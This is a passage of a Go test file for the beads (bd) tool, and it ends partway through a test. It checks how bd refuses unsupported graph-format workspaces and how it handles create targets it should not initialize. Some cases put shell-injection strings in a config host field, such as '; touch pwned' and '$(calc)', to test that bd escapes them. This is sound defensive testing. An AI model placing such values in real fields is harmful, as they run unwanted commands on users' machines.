//go:build cgo

package main

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/steveyegge/beads/internal/configfile"
	"github.com/steveyegge/beads/internal/remedy"
	"github.com/steveyegge/beads/internal/storage"
	"github.com/steveyegge/beads/internal/testutil/legacyworkspace"
)

// graphLinkWorkspaceMetadata is the metadata.json a graph_mode link workspace
// carries: the marker, its binding, and an ordinary embedded Dolt backend.
const graphLinkWorkspaceMetadata = `{
  "database": "",
  "backend": "dolt",
  "graph_mode": "link",
  "graph_scope_url": "https://example.test/scope",
  "graph_authority_id": "0123456789abcdef0123456789abcdef",
  "graph_workspace": "/work/repo/.beads",
  "graph_schema_version": 7,
  "graph_ready": true,
  "dolt_mode": "embedded",
  "dolt_database": "beads_graph_0123456789abcdef0123456789abcdef",
  "project_id": "0123456789abcdef0123456789abcdef"
}`

// graphStrippedWorkspaceMetadata is graphLinkWorkspaceMetadata as a bd that
// predates graph_mode leaves it after any Save: the graph_* keys are gone, and
// the database name still selects the graph database.
const graphStrippedWorkspaceMetadata = `{
  "database": "",
  "backend": "dolt",
  "dolt_mode": "embedded",
  "dolt_database": "beads_graph_0123456789abcdef0123456789abcdef",
  "project_id": "0123456789abcdef0123456789abcdef"
}`

// graphWorkspaceLayout is a .beads directory whose metadata declares a
// graph_mode, plus whatever else the case lays down beside it.
type graphWorkspaceLayout struct {
	// filename is the metadata file; "" lays down no metadata.
	filename string
	metadata string
	// marker adds the graph-preview-format sentinel graph-preview builds
	// write before metadata.json.
	marker bool
	// embedded adds the embedded Dolt root a graph database lives in.
	embedded bool
	// doltRoot adds a .beads/dolt root without a version witness, which
	// the legacy classification reads as a pre-1.0 Dolt workspace.
	doltRoot bool
	// sqlite adds a beads.db, which the legacy classification reads as a
	// historical SQLite workspace when nothing else selects Dolt.
	sqlite bool
}

// write lays the layout down under beadsDir and returns the metadata path, or
// "" when the layout has no metadata.
func (l graphWorkspaceLayout) write(t *testing.T, beadsDir string) string {
	t.Helper()
	path := ""
	if l.filename != "" {
		path = filepath.Join(beadsDir, l.filename)
		writeFile(t, path, []byte(l.metadata))
	}
	if l.marker {
		writeFile(t, filepath.Join(beadsDir, "graph-preview-format"), []byte("link-preview-v9\n"))
	}
	if l.embedded {
		if err := os.MkdirAll(filepath.Join(beadsDir, "embeddeddolt", "beads_graph_0123456789abcdef0123456789abcdef", ".dolt"), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	if l.doltRoot {
		if err := os.Mkdir(filepath.Join(beadsDir, "dolt"), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	if l.sqlite {
		writeFile(t, filepath.Join(beadsDir, "beads.db"), []byte("SQLite format 3\x00"))
	}
	return path
}

func TestWorkspaceFormatGuardRefusesGraphWorkspaces(t *testing.T) {
	pinLegacyUpgradeGuardEnv(t)
	tests := []struct {
		name   string
		layout graphWorkspaceLayout
		mode   string
	}{
		{name: "link embedded", mode: "link",
			layout: graphWorkspaceLayout{filename: "metadata.json", metadata: graphLinkWorkspaceMetadata, embedded: true}},
		// The legacy classification admits this shape: a server workspace
		// with no local Dolt root.
		{name: "link server", mode: "link",
			layout: graphWorkspaceLayout{filename: "metadata.json", metadata: `{"backend":"dolt","dolt_mode":"server","graph_mode":"link"}`}},
		{name: "link legacy config.json", mode: "link",
			layout: graphWorkspaceLayout{filename: "config.json", metadata: graphLinkWorkspaceMetadata, embedded: true}},
		{name: "unknown marker", mode: "future-format",
			layout: graphWorkspaceLayout{filename: "metadata.json", metadata: `{"backend":"dolt","graph_mode":"future-format"}`, embedded: true}},
		{name: "marker is case-sensitive", mode: "Dependency",
			layout: graphWorkspaceLayout{filename: "metadata.json", metadata: `{"backend":"dolt","graph_mode":"Dependency"}`, embedded: true}},
		// Without the format check first, these two shapes are reported as
		// legacy workspaces to migrate.
		{name: "link over legacy dolt root", mode: "link",
			layout: graphWorkspaceLayout{filename: "metadata.json", metadata: `{"backend":"dolt","graph_mode":"link"}`, doltRoot: true}},
		{name: "link beside historical sqlite", mode: "link",
			layout: graphWorkspaceLayout{filename: "metadata.json", metadata: `{"graph_mode":"link"}`, sqlite: true}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			beadsDir := t.TempDir()
			path := tt.layout.write(t, beadsDir)
			before := legacyUpgradeTreeDigest(t, beadsDir)

			err := guardLegacyUpgradeWorkspace(beadsDir)
			if !isUnsupportedWorkspaceFormat(err) {
				t.Fatalf("guardLegacyUpgradeWorkspace() = %v, want unsupported workspace format refusal", err)
			}
			for _, want := range []string{beadsDir, `graph_mode "` + tt.mode + `"`, "this bd build does not support", "no storage database was opened or modified"} {
				if !strings.Contains(err.Error(), want) {
					t.Fatalf("refusal %q does not mention %q", err, want)
				}
			}
			if after := legacyUpgradeTreeDigest(t, beadsDir); after != before {
				t.Fatalf("guard changed the workspace")
			}
			if got, readErr := os.ReadFile(path); readErr != nil || string(got) != tt.layout.metadata {
				t.Fatalf("guard rewrote %s: %q, %v", tt.layout.filename, got, readErr)
			}
		})
	}
}

// A graph workspace whose metadata does not declare graph_mode is still
// refused by its format marker: graph-preview builds write the marker before
// metadata.json, and a bd that predates graph_mode drops the field on Save.
func TestWorkspaceFormatGuardRefusesFormatMarker(t *testing.T) {
	pinLegacyUpgradeGuardEnv(t)
	tests := []struct {
		name   string
		layout graphWorkspaceLayout
	}{
		// Graph init interrupted after the marker, before metadata.json.
		{name: "marker only", layout: graphWorkspaceLayout{marker: true}},
		{name: "metadata lost", layout: graphWorkspaceLayout{marker: true, embedded: true}},
		{name: "metadata stripped", layout: graphWorkspaceLayout{filename: "metadata.json", metadata: graphStrippedWorkspaceMetadata, marker: true, embedded: true}},
		{name: "legacy config.json stripped", layout: graphWorkspaceLayout{filename: "config.json", metadata: graphStrippedWorkspaceMetadata, marker: true, embedded: true}},
		{name: "server metadata stripped", layout: graphWorkspaceLayout{filename: "metadata.json", metadata: `{"backend":"dolt","dolt_mode":"server"}`, marker: true}},
		{name: "explicit dependency", layout: graphWorkspaceLayout{filename: "metadata.json", metadata: `{"backend":"dolt","graph_mode":"dependency"}`, marker: true, embedded: true}},
		// Metadata that does not parse (a conflicted merge, a truncated
		// write) cannot outrank the marker.
		{name: "unparseable metadata", layout: graphWorkspaceLayout{filename: "metadata.json", metadata: `{"backend":"dolt",`, marker: true, embedded: true}},
		// Without the format check first, this is reported as a legacy
		// Dolt workspace to migrate.
		{name: "marker over legacy dolt root", layout: graphWorkspaceLayout{marker: true, doltRoot: true}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			beadsDir := t.TempDir()
			path := tt.layout.write(t, beadsDir)
			before := legacyUpgradeTreeDigest(t, beadsDir)

			err := guardLegacyUpgradeWorkspace(beadsDir)
			if !isUnsupportedWorkspaceFormat(err) {
				t.Fatalf("guardLegacyUpgradeWorkspace() = %v, want unsupported workspace format refusal", err)
			}
			for _, want := range []string{beadsDir, "graph-preview-format", "this bd build does not support", "no storage database was opened or modified"} {
				if !strings.Contains(err.Error(), want) {
					t.Fatalf("refusal %q does not mention %q", err, want)
				}
			}
			if after := legacyUpgradeTreeDigest(t, beadsDir); after != before {
				t.Fatalf("guard changed the workspace")
			}
			if path != "" {
				if got, readErr := os.ReadFile(path); readErr != nil || string(got) != tt.layout.metadata {
					t.Fatalf("guard rewrote %s: %q, %v", tt.layout.filename, got, readErr)
				}
			}
		})
	}
	// The marker's presence is the signal, not its content.
	for _, content := range []string{"", "link-preview-v5\n", "not a generation"} {
		t.Run("content "+strconv.Quote(content), func(t *testing.T) {
			beadsDir := t.TempDir()
			writeFile(t, filepath.Join(beadsDir, "graph-preview-format"), []byte(content))
			if err := guardLegacyUpgradeWorkspace(beadsDir); !isUnsupportedWorkspaceFormat(err) {
				t.Fatalf("guardLegacyUpgradeWorkspace() = %v, want unsupported workspace format refusal", err)
			}
		})
	}
}

// With no workspace directory there is no marker to look for: an empty
// beadsDir must not probe the working directory.
func TestWorkspaceFormatCheckWithoutWorkspaceDirectory(t *testing.T) {
	t.Chdir(t.TempDir())
	writeFile(t, "graph-preview-format", []byte("link-preview-v9\n"))
	if err := checkWorkspaceFormat(nil, ""); err != nil {
		t.Fatalf("checkWorkspaceFormat(nil, \"\") = %v, want nil", err)
	}
	if err := validateConfiguredBackend(&configfile.Config{Backend: configfile.BackendDolt}, ""); err != nil {
		t.Fatalf("validateConfiguredBackend(dolt, \"\") = %v, want nil", err)
	}
}

// Bootstrap in a workspace with no metadata of its own takes its nearest
// ancestor's. An ancestor declared a graph workspace only by its format marker
// is refused like one declaring graph_mode: neither skipped for a more distant
// workspace or the defaults, nor reported as a metadata load failure.
func TestFindParentConfigRefusesMarkedAncestor(t *testing.T) {
	pinLegacyUpgradeGuardEnv(t)
	for name, layout := range map[string]graphWorkspaceLayout{
		"marker only":                  {marker: true},
		"marker, metadata unparseable": {filename: "metadata.json", metadata: `{"backend":`, marker: true, embedded: true},
		"marker, metadata stripped":    {filename: "metadata.json", metadata: graphStrippedWorkspaceMetadata, marker: true, embedded: true},
	} {
		t.Run(name, func(t *testing.T) {
			outer := t.TempDir()
			// An ordinary workspace further up must not be selected instead.
			writeFile(t, filepath.Join(outer, ".beads", "metadata.json"), []byte(`{"backend":"dolt","dolt_database":"outer"}`))
			graphDir := filepath.Join(outer, "graph")
			graphBeadsDir := filepath.Join(graphDir, ".beads")
			layout.write(t, graphBeadsDir)
			before := legacyUpgradeTreeDigest(t, graphBeadsDir)
			t.Setenv("HOME", outer)

			cfg, err := findParentConfig(filepath.Join(graphDir, "inner", ".beads"))
			if !isUnsupportedWorkspaceFormat(err) {
				t.Fatalf("findParentConfig() = %+v, %v, want unsupported workspace format refusal", cfg, err)
			}
			if !strings.Contains(err.Error(), "graph-preview-format") {
				t.Fatalf("refusal %q does not name the marker", err)
			}
			if after := legacyUpgradeTreeDigest(t, graphBeadsDir); after != before {
				t.Fatal("findParentConfig changed the graph workspace")
			}
		})
	}
}

func TestWorkspaceFormatGuardAdmitsDependencyWorkspaces(t *testing.T) {
	pinLegacyUpgradeGuardEnv(t)
	for _, metadata := range []string{
		`{"backend":"dolt"}`,
		`{"backend":"dolt","graph_mode":""}`,
		`{"backend":"dolt","graph_mode":"dependency"}`,
	} {
		t.Run(metadata, func(t *testing.T) {
			beadsDir := t.TempDir()
			writeFile(t, filepath.Join(beadsDir, "metadata.json"), []byte(metadata))
			if err := guardLegacyUpgradeWorkspace(beadsDir); err != nil {
				t.Fatalf("guardLegacyUpgradeWorkspace() = %v, want admission", err)
			}
		})
	}
	if err := guardLegacyUpgradeWorkspace(t.TempDir()); err != nil {
		t.Fatalf("guardLegacyUpgradeWorkspace(no metadata) = %v, want admission", err)
	}
}

// Routed writes, cross-repository reads and create --repo open another
// workspace's store without passing through command admission, so the store
// factories must refuse a graph workspace themselves, before any open. That
// includes one marked only by a legacy config.json, which configfile.Load
// would migrate into metadata.json before a check of the loaded metadata ran,
// and one declared only by the graph format marker, whose metadata is
// stripped, lost or unparseable.
func TestStoreFactoriesRefuseGraphWorkspace(t *testing.T) {
	pinLegacyUpgradeGuardEnv(t)
	factories := map[string]func(context.Context, string) (storage.DoltStorage, error){
		"read-write": newDoltStoreFromConfig,
		"routed":     newExistingDoltStoreFromConfig,
		"read-only":  newReadOnlyStoreFromConfig,
		"preview":    newPreviewStoreFromConfig,
	}
	layouts := map[string]graphWorkspaceLayout{
		"metadata.json graph_mode link": {filename: "metadata.json", metadata: graphLinkWorkspaceMetadata, embedded: true},
		"config.json graph_mode link":   {filename: "config.json", metadata: graphLinkWorkspaceMetadata, embedded: true},
		"marker, metadata stripped":     {filename: "metadata.json", metadata: graphStrippedWorkspaceMetadata, marker: true, embedded: true},
		// No metadata at all: the factories must not fall back to the
		// default database before looking for the marker.
		"marker, metadata lost": {marker: true, embedded: true},
		// Metadata that does not parse beside the marker: the marker alone
		// declares the format, so this is refused as that, not reported as
		// a metadata load failure.
		"marker, metadata unparseable": {filename: "metadata.json", metadata: `{"backend":`, marker: true, embedded: true},
	}
	for layoutName, layout := range layouts {
		for name, open := range factories {
			t.Run(layoutName+"/"+name, func(t *testing.T) {
				beadsDir := t.TempDir()
				path := layout.write(t, beadsDir)
				before := legacyUpgradeTreeDigest(t, beadsDir)
				store, err := open(t.Context(), beadsDir)
				if err == nil {
					_ = store.Close()
				}
				if !isUnsupportedWorkspaceFormat(err) {
					t.Fatalf("%s open = %v, want unsupported workspace format refusal", name, err)
				}
				if after := legacyUpgradeTreeDigest(t, beadsDir); after != before {
					t.Fatalf("%s open changed the workspace", name)
				}
				if path != "" {
					if got, readErr := os.ReadFile(path); readErr != nil || string(got) != layout.metadata {
						t.Fatalf("%s open rewrote %s: %q, %v", name, layout.filename, got, readErr)
					}
				}
			})
		}
	}
}

// Error framing and the bd dolt diagnostics read a workspace's metadata outside
// the store factories: framing names the backend of an open that may have just
// been refused, and bd dolt show and status, which admission guards already,
// load and validate it again. None of them may migrate a graph workspace's
// legacy config.json into metadata.json, and the diagnostics refuse it the way
// admission does.
func TestWorkspaceMetadataReadersLeaveGraphWorkspaceUnchanged(t *testing.T) {
	pinLegacyUpgradeGuardEnv(t)
	requireFormatExit := func(t *testing.T, name string, run func() error) {
		t.Helper()
		var err error
		captureStderr(t, func() { err = run() })
		if code, ok := exitCodeFromError(err); !ok || code != ExitUnsupportedWorkspaceFormat {
			t.Fatalf("%s exit code = %d (%v), want %d", name, code, ok, ExitUnsupportedWorkspaceFormat)
		}
	}
	readers := map[string]func(t *testing.T, beadsDir string){
		"error framing": func(t *testing.T, beadsDir string) {
			if got := backendNameForErrorFraming(beadsDir); got != configfile.BackendDolt {
				t.Fatalf("backendNameForErrorFraming = %q, want %q", got, configfile.BackendDolt)
			}
		},
		"dolt backend config": func(t *testing.T, beadsDir string) {
			if _, err := loadDoltBackendConfig(beadsDir); !isUnsupportedWorkspaceFormat(err) {
				t.Fatalf("loadDoltBackendConfig = %v, want unsupported workspace format refusal", err)
			}
		},
		"dolt show": func(t *testing.T, _ string) {
			requireFormatExit(t, "bd dolt show", func() error { return showDoltConfig(false) })
		},
		"dolt status": func(t *testing.T, _ string) {
			requireFormatExit(t, "bd dolt status", func() error { return doltStatusCmd.RunE(doltStatusCmd, nil) })
		},
	}
	for _, filename := range []string{"metadata.json", "config.json"} {
		for name, read := range readers {
			t.Run(filename+"/"+name, func(t *testing.T) {
				beadsDir := t.TempDir()
				// The embedded root lets workspace discovery select a
				// workspace marked only by config.json.
				path := graphWorkspaceLayout{filename: filename, metadata: graphLinkWorkspaceMetadata, embedded: true}.write(t, beadsDir)
				t.Setenv("BEADS_DIR", beadsDir)
				before := legacyUpgradeTreeDigest(t, beadsDir)
				read(t, beadsDir)
				if after := legacyUpgradeTreeDigest(t, beadsDir); after != before {
					t.Fatalf("%s changed the workspace", name)
				}
				if got, err := os.ReadFile(path); err != nil || string(got) != graphLinkWorkspaceMetadata {
					t.Fatalf("%s rewrote %s: %q, %v", name, filename, got, err)
				}
			})
		}
	}
}

func TestHandleWorkspaceGuardErrorExitCodes(t *testing.T) {
	if err := handleWorkspaceGuardError(nil); err != nil {
		t.Fatalf("handleWorkspaceGuardError(nil) = %v", err)
	}
	formatErr := &configfile.UnsupportedWorkspaceFormatError{BeadsDir: "/w/.beads", GraphMode: "link"}
	markerDir := t.TempDir()
	writeFile(t, filepath.Join(markerDir, "graph-preview-format"), []byte("link-preview-v9\n"))
	markerErr := checkWorkspaceFormat(nil, markerDir)
	if markerErr == nil {
		t.Fatalf("checkWorkspaceFormat(no metadata, format marker) = nil, want a refusal")
	}
	tests := []struct {
		name string
		err  error
		want int
	}{
		{name: "unsupported format", err: formatErr, want: ExitUnsupportedWorkspaceFormat},
		{name: "format marker", err: markerErr, want: ExitUnsupportedWorkspaceFormat},
		{name: "legacy refusal", err: legacyUpgradeRefusal("legacy Dolt workspace"), want: 1},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var got error
			stderr := captureStderr(t, func() { got = handleWorkspaceGuardError(tt.err) })
			if code, ok := exitCodeFromError(got); !ok || code != tt.want {
				t.Fatalf("exit code = %d (%v), want %d", code, ok, tt.want)
			}
			if !strings.Contains(stderr, "Error: "+tt.err.Error()) {
				t.Fatalf("stderr does not carry the refusal:\n%s", stderr)
			}
		})
	}
	if ExitUnsupportedWorkspaceFormat != 16 {
		t.Fatalf("ExitUnsupportedWorkspaceFormat = %d; it is a stable scripting contract", ExitUnsupportedWorkspaceFormat)
	}
}

// A create target without metadata.json is refused when it declares a graph
// format, and is otherwise left to the auto-initialization path as before,
// even when its legacy config.json cannot be parsed.
func TestEnsureBeadsDirForPathChecksWorkspaceFormat(t *testing.T) {
	malformedConfig := `{"backend":"dolt",`
	for _, tc := range []struct {
		name       string
		marker     bool
		wantFormat bool
	}{
		{name: "malformed config.json", marker: false, wantFormat: false},
		{name: "malformed config.json beside the marker", marker: true, wantFormat: true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			targetDir := t.TempDir()
			beadsDir := filepath.Join(targetDir, ".beads")
			if err := os.MkdirAll(beadsDir, 0o750); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(beadsDir, "config.json"), []byte(malformedConfig), 0o600); err != nil {
				t.Fatal(err)
			}
			if tc.marker {
				if err := os.WriteFile(filepath.Join(beadsDir, "graph-preview-format"), []byte("1\n"), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			// allowCreate=false stops just after the format check, before
			// anything is created, so the result shows which branch ran.
			err := ensureBeadsDirForPath(context.Background(), targetDir, nil, false)
			if err == nil {
				t.Fatal("ensureBeadsDirForPath() = nil, want an error")
			}
			if got := isUnsupportedWorkspaceFormat(err); got != tc.wantFormat {
				t.Fatalf("ensureBeadsDirForPath() = %v, unsupported format = %v, want %v", err, got, tc.wantFormat)
			}
			if !tc.wantFormat && !strings.Contains(err.Error(), "no beads workspace found") {
				t.Fatalf("ensureBeadsDirForPath() = %v, want the not-auto-created refusal", err)
			}
		})
	}
}

// A create target whose .beads has no metadata.json is refused, with nothing
// written, when initializing it would hide what bd run there already reads:
// its own config selects Dolt server mode, by dolt.mode or, with no dolt.mode,
// by a non-local dolt.host (config.local.yaml beside config.yaml outranks it;
// a lone config.local.yaml is not read, as bd's own config merge does not read
// one), its config cannot be read (a section whose children are all commented
// out reads as unset, as bd reads it), bd's own
// admission refuses it, or it holds several databases. Server mode is decided
// first, from the target's own config, so a server workspace bd's admission
// would misread as legacy from the launcher's mode gets the server refusal.
// The bd init remedy for a remote dolt.host names the host quoted for the
// shell, or a <host> placeholder the refusal names when no shell takes it
// quoted, and the port the target's own config names (else 3307), so a local
// server's stale dolt-server.port beside it is never dialed on that host.
func TestEnsureBeadsDirForPathRefusesTargetsItWouldHide(t *testing.T) {
	writeFiles := func(t *testing.T, beadsDir string, files map[string]string) {
		t.Helper()
		for name, content := range files {
			path := filepath.Join(beadsDir, name)
			if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
				t.Fatal(err)
			}
		}
	}
	// databaseMarker is the file embeddeddolt.Databases looks for to count an
	// embedded database.
	databaseMarker := func(database string) string {
		return filepath.Join("embeddeddolt", database, ".dolt", "noms", "manifest")
	}
	// remote is the --server-host/--server-port pair a remedy names: the host
	// quoted for this host's shell, or the <host> placeholder where that shell
	// cannot take it quoted (TestServerInitRemedy pins which, on both
	// platforms).
	remote := func(host string, port int) string {
		quoted, ok := remedy.ShellQuotedFor(runtime.GOOS, host)
		if !ok {
			quoted = "<host>"
		}
		return "--server-host " + quoted + " --server-port " + strconv.Itoa(port)
	}
	// craftedName is how a refusal names the dolt.host x\'; $(calc), which no
	// shell on either platform takes quoted (TestEscapedValue).
	const craftedName = `"x\\\x27\x3b \x24(calc)"`
	for _, tc := range []struct {
		name  string
		files map[string]string
		want  string // "" = not refused
	}{
		{name: "server mode in config.yaml", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n"}, want: "Run: bd init --database <name> there"},
		{name: "server mode with a local dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: 127.0.0.1\n"}, want: "Run: bd init --database <name> there"},
		{name: "server mode with a remote dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: db.example.com\n"}, want: "Run: bd init " + remote("db.example.com", 3307) + " --database <name> there"},
		{name: "server mode with a remote dolt.host beside a stale port file", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: db.example.com\n  port: 3310\n", "dolt-server.port": "45678\n"}, want: "Run: bd init " + remote("db.example.com", 3310) + " --database <name> there"},
		{name: "server mode with an unreadable dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: [a, b]\n"}, want: "Run: bd init --database <name> there"},
		{name: "server mode in dotted config.yaml", files: map[string]string{"config.yaml": "dolt.mode: SERVER\n"}, want: "selects Dolt server mode"},
		{name: "server mode in config.local.yaml", files: map[string]string{"config.yaml": "dolt:\n  mode: embedded\n", "config.local.yaml": "dolt:\n  mode: server\n"}, want: "selects Dolt server mode"},
		{name: "lone config.local.yaml", files: map[string]string{"config.local.yaml": "dolt:\n  mode: server\n"}},
		{name: "embedded mode in config.yaml", files: map[string]string{"config.yaml": "dolt:\n  mode: embedded\n"}},
		{name: "unreadable config.yaml", files: map[string]string{"config.yaml": "dolt: [unterminated\n"}, want: "dolt.mode cannot be read"},
		{name: "commented-out dolt section", files: map[string]string{"config.yaml": "dolt:\n  # mode: server\n"}},
		{name: "remote dolt.host in config.yaml", files: map[string]string{"config.yaml": "dolt:\n  host: db.example.com\n  port: 3307\n"}, want: "selects Dolt server mode (dolt.host: \"db.example.com\"); not initializing it as an embedded workspace, which would hide its server data. Run: bd init --server " + remote("db.example.com", 3307) + " --database <name> there"},
		{name: "remote dolt.host and no dolt.port beside a stale port file", files: map[string]string{"config.yaml": "dolt:\n  host: db.example.com\n", "dolt-server.port": "45678\n"}, want: "Run: bd init --server " + remote("db.example.com", 3307) + " --database <name> there"},
		{name: "remote dolt.host with a dolt.port that is not a port", files: map[string]string{"config.yaml": "dolt:\n  host: db.example.com\n  port: none\n"}, want: "Run: bd init --server " + remote("db.example.com", 3307) + " --database <name> there"},
		{name: "remote dolt.host in config.local.yaml", files: map[string]string{"config.yaml": "dolt:\n  host: 127.0.0.1\n", "config.local.yaml": "dolt:\n  host: 10.0.0.5\n"}, want: "Run: bd init --server " + remote("10.0.0.5", 3307) + " --database <name> there"},
		{name: "dolt.port in config.local.yaml", files: map[string]string{"config.yaml": "dolt:\n  host: db.example.com\n  port: 3311\n", "config.local.yaml": "dolt:\n  port: 3312\n"}, want: "Run: bd init --server " + remote("db.example.com", 3312) + " --database <name> there"},
		// The host is the target repository's content, pasted into a command.
		// It is named escaped (TestEscapedValue) beside the command too.
		{name: "remote dolt.host a shell would split", files: map[string]string{"config.yaml": "dolt:\n  host: \"db.example.com; touch pwned\"\n"}, want: "(dolt.host: \"db.example.com\\x3b touch pwned\"); not initializing it as an embedded workspace, which would hide its server data. Run: bd init --server " + remote("db.example.com; touch pwned", 3307) + " --database <name> there"},
		// One no shell on either platform takes quoted (TestShellQuotedFor) is
		// left as a placeholder the refusal names, on every platform.
		{name: "remote dolt.host no shell takes quoted", files: map[string]string{"config.yaml": "dolt:\n  host: \"x\\\\'; $(calc)\"\n"}, want: "(dolt.host: " + craftedName + "); not initializing it as an embedded workspace, which would hide its server data. Run: bd init --server --server-host <host> --server-port 3307 --database <name> there with its dolt.host " + craftedName + " for <host>, naming the server database it uses"},
		{name: "server mode with a remote dolt.host no shell takes quoted", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: \"x\\\\'; $(calc)\"\n"}, want: "Run: bd init --server-host <host> --server-port 3307 --database <name> there with its dolt.host " + craftedName + " for <host>, naming the server database it uses"},
		// The remedy names the target's dolt.host whenever bd does not run its
		// server there (configfile.BdRunsServerAt): bd init dials 127.0.0.1
		// otherwise and would initialize bd's own server instead of the one
		// the target names. The IPv6 loopback and another loopback address
		// are on this machine, but bd's own server never listens there.
		{name: "server mode with an IPv6 loopback dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: \"::1\"\n  port: 23417\n"}, want: "Run: bd init " + remote("::1", 23417) + " --database <name> there"},
		{name: "server mode with a bracketed IPv6 loopback dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: \"[::1]\"\n  port: 23417\n"}, want: "Run: bd init " + remote("[::1]", 23417) + " --database <name> there"},
		{name: "server mode with a long-form IPv6 loopback dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: \"0:0:0:0:0:0:0:1\"\n"}, want: "Run: bd init " + remote("0:0:0:0:0:0:0:1", 3307) + " --database <name> there"},
		{name: "server mode with another loopback dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: 127.0.0.2\n"}, want: "Run: bd init " + remote("127.0.0.2", 3307) + " --database <name> there"},
		{name: "server mode with an upper-case localhost dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: LOCALHOST\n"}, want: "Run: bd init --database <name> there"},
		{name: "IPv6 loopback dolt.host without dolt.mode", files: map[string]string{"config.yaml": "dolt:\n  host: \"::1\"\n"}},
		{name: "another loopback dolt.host without dolt.mode", files: map[string]string{"config.yaml": "dolt:\n  host: 127.0.0.2\n"}, want: "Run: bd init --server " + remote("127.0.0.2", 3307) + " --database <name> there"},
		{name: "local dolt.host 127.0.0.1", files: map[string]string{"config.yaml": "dolt:\n  host: 127.0.0.1\n"}},
		{name: "local dolt.host localhost", files: map[string]string{"config.yaml": "dolt.host: localhost\n"}},
		{name: "remote dolt.host under embedded mode", files: map[string]string{"config.yaml": "dolt:\n  mode: embedded\n  host: db.example.com\n"}},
		{name: "unreadable dolt.host", files: map[string]string{"config.yaml": "dolt:\n  host: [a, b]\n"}, want: "dolt.host cannot be read"},
		{name: "server mode beside a legacy dolt root", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n", "dolt/leftover": "x"}, want: "selects Dolt server mode"},
		{name: "several databases", files: map[string]string{databaseMarker("beads"): "x", databaseMarker("other"): "x"}, want: "holds several databases (beads, other)"},
		{name: "sqlite-era repo", files: map[string]string{"config.json": `{"database":"beads.db"}`, "beads.db": "SQLite format 3\x00" + strings.Repeat("\x00", 4080)}, want: "historical SQLite workspace"},
		// A clone of a project from before bd wrote config.json holds only its
		// tracked issues.jsonl: bd run there finds no workspace, and the
		// database written here would keep bd's upgrade auto-import, which
		// loads issues.jsonl only into an empty database, from ever loading it.
		{name: "issues.jsonl and no database", files: legacyworkspace.PreConfigJSONClone().Files, want: "it has issues.jsonl but no database (a fresh clone of a project from before bd wrote config.json, say), so bd run there does not treat it as a workspace; not initializing it, which would hide what it holds behind an empty database. Run `bd init --from-jsonl` in "},
		// An empty .beads (contributor setup leaves one), an empty
		// issues.jsonl, which holds nothing to hide, and a redirect stub,
		// whose own files bd run there never reads, are initialized as before.
		{name: "empty .beads"},
		{name: "empty issues.jsonl", files: map[string]string{"issues.jsonl": ""}},
		// An issues.jsonl that is not a regular file is no tracked export.
		{name: "issues.jsonl directory", files: map[string]string{"issues.jsonl/keep": ""}},
		// A config.yaml beside issues.jsonl makes it a workspace to discovery
		// (beads.HasProjectFiles), so it is initialized as before.
		{name: "config.yaml beside issues.jsonl", files: map[string]string{"config.yaml": "dolt:\n  mode: embedded\n", "issues.jsonl": `{"id":"old-1"}` + "\n"}},
		{name: "issues.jsonl in a redirect stub", files: map[string]string{"redirect": "shared/.beads\n", "issues.jsonl": `{"id":"old-1","title":"stub"}` + "\n", "../shared/.beads/metadata.json": `{"backend":"dolt"}`}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			targetDir := t.TempDir()
			beadsDir := filepath.Join(targetDir, ".beads")
			if err := os.MkdirAll(beadsDir, 0o750); err != nil {
				t.Fatal(err)
			}
			writeFiles(t, beadsDir, tc.files)
			before := planningDirListing(t, beadsDir)

			// A nil source store initializes nothing past these refusals,
			// so a target that is not refused is left with no metadata.json.
			err := ensureBeadsDirForPath(context.Background(), targetDir, nil, true)
			switch {
			case tc.want == "" && err != nil:
				t.Fatalf("ensureBeadsDirForPath() = %v, want nil", err)
			case tc.want != "" && (err == nil || !strings.Contains(err.Error(), tc.want)):
				t.Fatalf("ensureBeadsDirForPath() = %v, want a refusal containing %q", err, tc.want)
			}
			if tc.want != "" {
				if after := planningDirListing(t, beadsDir); !slices.Equal(after, before) {
					t.Errorf(".beads after a refused initialization = %v, want unchanged %v", after, before)
				}
			}
		})
	}
}

// TestServerInitRemedy pins the bd init remedy for a metadata-less target whose
// config selects Dolt server mode, on both platforms: a remote dolt.host is
// passed quoted for the shell it is pasted into (TestShellQuotedFor), with the
// port the target's own config names, else 3307. A host no quoting passes on
// unchanged there, such as one that would run a command from cmd.exe,
// PowerShell or fish, pass bd init a second argument through a .cmd shim, or
// redraw or reorder the printed command with terminal control characters or
// U+202E, is left as a <host> placeholder that the note names escaped, with
// every character a shell acts on escaped too (TestEscapedValue).
func TestServerInitRemedy(t *testing.T) {
	t.Parallel()
	const crafted = `x" & calc & "$(calc)`
	for _, tc := range []struct {
		name, goos, initCmd, host, configYAML string
		want, wantNote                        string
	}{
		{name: "no remote host", goos: "windows", initCmd: "bd init", want: "bd init --database <name>"},
		{name: "remote host on POSIX", goos: "linux", initCmd: "bd init --server", host: "db.example.com", want: "bd init --server --server-host 'db.example.com' --server-port 3307 --database <name>"},
